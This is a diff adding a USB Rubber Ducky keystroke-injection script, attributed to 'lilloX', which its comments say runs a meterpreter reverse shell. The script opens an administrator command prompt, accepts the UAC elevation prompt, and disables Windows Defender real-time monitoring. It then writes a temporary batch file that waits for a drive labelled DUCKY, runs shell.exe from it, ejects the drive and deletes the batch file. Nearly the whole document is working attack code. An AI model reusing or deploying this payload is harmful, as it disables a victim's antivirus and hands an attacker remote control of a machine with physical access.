@@ -1,0 +1,77 @@
+REM Author: Domenico Malorni (lilloX)
+REM run a meterpreter reverse shell
+REM Name: winshell.payload
+DEFAULT_DELAY 75
+DELAY 3000
+REM get a cmd prompt this way because it's admin and we need that
+CONTROL ESCAPE
+DELAY 1000
+STRING cmd
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 300
+ENTER
+REM Use powershell to disable Windows Defender
+STRING powershell
+DELAY 300
+ENTER
+REM Disable Windows Defender Real time monitoring
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 300
+STRING exit
+ENTER
+DELAY 300
+REM Change to temp directory.
+STRING C:
+ENTER
+STRING CD %TEMP%
+ENTER
+REM Make batch file that waits for SD card to mount.
+REM When the SD is ready then run the shell.exe
+REM Delete batch file if already exists
+STRING erase /Q DuckyWait.bat
+ENTER
+STRING copy con DuckyWait.bat
+ENTER
+REM DuckyWait.bat contents
+STRING :while1
+ENTER
+STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set myd=%%d
+ENTER
+STRING if Exist %myd% (
+ENTER
+STRING %myd%\shell.exe
+ENTER
+STRING timeout /t 5
+ENTER
+STRING goto break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 30
+ENTER
+STRING goto while1
+ENTER
+STRING :break
+ENTER
+STRING powershell -noprofile -command "$driveEject = New-Object -comObject Shell.Application; $driveEject.Namespace(17).ParseName('%myd%').InvokeVerb('Eject')"
+ENTER
+ENTER
+CONTROL Z
+ENTER
+REM
+REM FINALLY ACTUALLY RUN THE PAYLOAD
+STRING DuckyWait.bat
+ENTER
+DELAY 1000
+ENTER
+STRING erase /Q DuckyWait.bat
+DELAY 300
+ENTER
+DELAY 1000
+ENTER
+STRING exit
+ENTER
